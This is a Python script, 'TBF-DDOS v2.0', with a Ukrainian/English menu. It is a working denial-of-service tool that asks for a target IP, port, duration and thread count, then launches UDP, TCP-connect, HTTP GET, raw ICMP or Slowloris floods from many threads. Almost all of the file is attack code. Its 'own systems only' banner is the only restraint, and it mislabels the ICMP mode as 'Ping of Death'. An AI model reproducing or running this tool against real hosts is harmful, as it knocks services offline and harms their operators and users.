#!/usr/bin/env python3
# ============================================
#   TBF-DDOS v2.0
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

import socket
import random
import threading
import time
import os
import sys
import struct
import logging

# Кольори
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Налаштування логування
logging.basicConfig(filename='tbf_ddos.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

# Глобальна змінна для мови
LANG = "ua"  # "ua" або "en"

def clear():
    os.system('clear')

def set_language():
    global LANG
    clear()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}🌍 Виберіть мову / Select language{RESET}                          {CYAN}║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}1.{RESET} 🇺🇦 Українська                                      {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}2.{RESET} 🇬🇧 English                                         {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    print()
    choice = input("👉 Виберіть / Choose (1-2): ")
    if choice == "2":
        LANG = "en"
    else:
        LANG = "ua"

def t(text):
    """Переклад тексту залежно від мови"""
    translations = {
        "ua": {
            "banner_title": "TBF-DDOS v2.0 — 5 типів атак",
            "banner_warning": "⚠️ ТІЛЬКИ ДЛЯ ТЕСТУВАННЯ ВЛАСНИХ СИСТЕМ! ⚠️",
            "menu_title": "📂 Виберіть тип атаки:",
            "menu_1": "📡 UDP Flood",
            "menu_2": "🔄 TCP SYN Flood",
            "menu_3": "🌐 HTTP Flood",
            "menu_4": "📦 ICMP Flood (Ping of Death)",
            "menu_5": "🐌 Slowloris (повільна атака)",
            "menu_6": "❌ Вихід",
            "menu_choice": "👉 Виберіть (1-6): ",
            "enter_ip": "📝 Введіть IP-адресу цілі: ",
            "enter_port": "📝 Введіть порт (наприклад, 80): ",
            "enter_duration": "📝 Введіть тривалість (секунди): ",
            "enter_threads": "📝 Введіть кількість потоків (наприклад, 50): ",
            "start_udp": "🔓 Запуск UDP-флуду на {}:{}",
            "start_syn": "🔓 Запуск SYN-флуду на {}:{}",
            "start_http": "🔓 Запуск HTTP-флуду на {}:{}",
            "start_icmp": "🔓 Запуск ICMP-флуду (Ping of Death) на {}",
            "start_slowloris": "🔓 Запуск Slowloris на {}:{}",
            "duration": "⏳ Тривалість: {}с | 🧵 Потоки: {}",
            "done": "✅ Атаку завершено!",
            "icmp_error": "❌ ICMP-атака потребує root-прав! Запустіть з sudo або як root.",
            "exit": "👋 Дякуємо, що використовуєте TBF-DDOS!",
            "invalid": "❌ Невірний вибір.",
            "press_enter": "Натисніть Enter..."
        },
        "en": {
            "banner_title": "🔥 TBF-DDOS v2.0 — 5 attack types",
            "banner_warning": "⚠️ FOR TESTING YOUR OWN SYSTEMS ONLY! ⚠️",
            "menu_title": "📂 Select attack type:",
            "menu_1": "📡 UDP Flood",
            "menu_2": "🔄 TCP SYN Flood",
            "menu_3": "🌐 HTTP Flood",
            "menu_4": "📦 ICMP Flood (Ping of Death)",
            "menu_5": "🐌 Slowloris (slow attack)",
            "menu_6": "❌ Exit",
            "menu_choice": "👉 Choose (1-6): ",
            "enter_ip": "📝 Enter target IP address: ",
            "enter_port": "📝 Enter port (e.g. 80): ",
            "enter_duration": "📝 Enter duration (seconds): ",
            "enter_threads": "📝 Enter number of threads (e.g. 50): ",
            "start_udp": "🔓 Starting UDP flood on {}:{}",
            "start_syn": "🔓 Starting SYN flood on {}:{}",
            "start_http": "🔓 Starting HTTP flood on {}:{}",
            "start_icmp": "🔓 Starting ICMP flood (Ping of Death) on {}",
            "start_slowloris": "🔓 Starting Slowloris on {}:{}",
            "duration": "⏳ Duration: {}s | 🧵 Threads: {}",
            "done": "✅ Attack completed!",
            "icmp_error": "❌ ICMP attack requires root privileges! Run with sudo or as root.",
            "exit": "👋 Thank you for using TBF-DDOS!",
            "invalid": "❌ Invalid choice.",
            "press_enter": "Press Enter..."
        }
    }
    return translations[LANG].get(text, text)

def banner():
    print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ████████╗██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗███████╗
║   ╚══██╔══╝██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝
║      ██║   ██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║   █████╗  
║      ██║   ██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║   ██╔══╝  
║      ██║   ██████╔╝██║         ██║ ╚████║╚██████╔╝   ██║   ███████╗
║      ╚═╝   ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝
║                                                                  ║
║        ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗            ║
║        ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝██║  ██║            ║
║        ██████╔╝██████╔╝██║   ██║    ███████╗███████║            ║
║        ██╔═══╝ ██╔══██╗██║   ██║    ╚════██║██╔══██║            ║
║        ██║     ██║  ██║╚██████╔╝    ███████║██║  ██║            ║
║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝            ║
║                                                                  ║
║                ██╗  ██╗██████╗ ██████╗  ██████╗                 ║
║                ██║  ██║██╔══██╗██╔══██╗██╔═══██╗                ║
║                ███████║██████╔╝██████╔╝██║   ██║                ║
║                ██╔══██║██╔═══╝ ██╔══██╗██║   ██║                ║
║                ██║  ██║██║     ██║  ██║╚██████╔╝                ║
║                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝                 ║
║                                                                  ║
║                     TBFPUMBA — TECHNOLOGY. SECURITY. EFFICIENCY  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{PURPLE}{t('banner_title')}{RESET}                              {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}{t('banner_warning')}{RESET}                    {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def log_attack(target_ip, target_port, attack_type, duration, threads):
    logging.info(f"Атака: {attack_type} | IP: {target_ip} | Порт: {target_port} | Тривалість: {duration}с | Потоки: {threads}")

def udp_flood(target_ip, target_port, duration, threads):
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (target_ip, target_port))
            except:
                pass
    
    log_attack(target_ip, target_port, "UDP Flood", duration, threads)
    print(f"{GREEN}{t('start_udp').format(target_ip, target_port)}{RESET}")
    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}{t('done')}{RESET}")

def syn_flood(target_ip, target_port, duration, threads):
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.close()
            except:
                pass
    
    log_attack(target_ip, target_port, "SYN Flood", duration, threads)
    print(f"{GREEN}{t('start_syn').format(target_ip, target_port)}{RESET}")
    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}{t('done')}{RESET}")

def http_flood(target_ip, target_port, duration, threads):
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                sock.close()
            except:
                pass
    
    log_attack(target_ip, target_port, "HTTP Flood", duration, threads)
    print(f"{GREEN}{t('start_http').format(target_ip, target_port)}{RESET}")
    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}{t('done')}{RESET}")

def icmp_flood(target_ip, duration, threads):
    if os.geteuid() != 0:
        print(f"{RED}{t('icmp_error')}{RESET}")
        return
    
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + random._urandom(56)
                sock.sendto(packet, (target_ip, 0))
            except:
                pass
    
    log_attack(target_ip, 0, "ICMP Flood", duration, threads)
    print(f"{GREEN}{t('start_icmp').format(target_ip)}{RESET}")
    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}{t('done')}{RESET}")

def slowloris(target_ip, target_port, duration, threads):
    def flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            while True:
                try:
                    sock.send(b"X-Header: keep-alive\r\n")
                    time.sleep(10)
                except:
                    break
        except:
            pass
    
    log_attack(target_ip, target_port, "Slowloris", duration, threads)
    print(f"{GREEN}{t('start_slowloris').format(target_ip, target_port)}{RESET}")
    print(f"{YELLOW}{t('duration').format(duration, threads)}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}{t('done')}{RESET}")

def show_menu():
    clear()
    banner()
    print(f"{GREEN}{t('menu_title')}{RESET}")
    print(f"  {YELLOW}1.{RESET} {t('menu_1')}")
    print(f"  {YELLOW}2.{RESET} {t('menu_2')}")
    print(f"  {YELLOW}3.{RESET} {t('menu_3')}")
    print(f"  {YELLOW}4.{RESET} {t('menu_4')}")
    print(f"  {YELLOW}5.{RESET} {t('menu_5')}")
    print(f"  {YELLOW}6.{RESET} {t('menu_6')}")
    print()
    return input(f"{t('menu_choice')}")

def main():
    set_language()
    while True:
        choice = show_menu()
        if choice in ["1", "2", "3", "4", "5"]:
            target_ip = input(f"{GREEN}{t('enter_ip')}{RESET}")
            target_port = 0
            if choice != "4":
                target_port = int(input(f"{GREEN}{t('enter_port')}{RESET}"))
            duration = int(input(f"{GREEN}{t('enter_duration')}{RESET}"))
            threads = int(input(f"{GREEN}{t('enter_threads')}{RESET}"))
            
            clear()
            banner()
            
            if choice == "1":
                udp_flood(target_ip, target_port, duration, threads)
            elif choice == "2":
                syn_flood(target_ip, target_port, duration, threads)
            elif choice == "3":
                http_flood(target_ip, target_port, duration, threads)
            elif choice == "4":
                icmp_flood(target_ip, duration, threads)
            elif choice == "5":
                slowloris(target_ip, target_port, duration, threads)
            
            input(f"\n{t('press_enter')}")
        elif choice == "6":
            clear()
            banner()
            print(f"{GREEN}{t('exit')}{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}{t('invalid')}{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
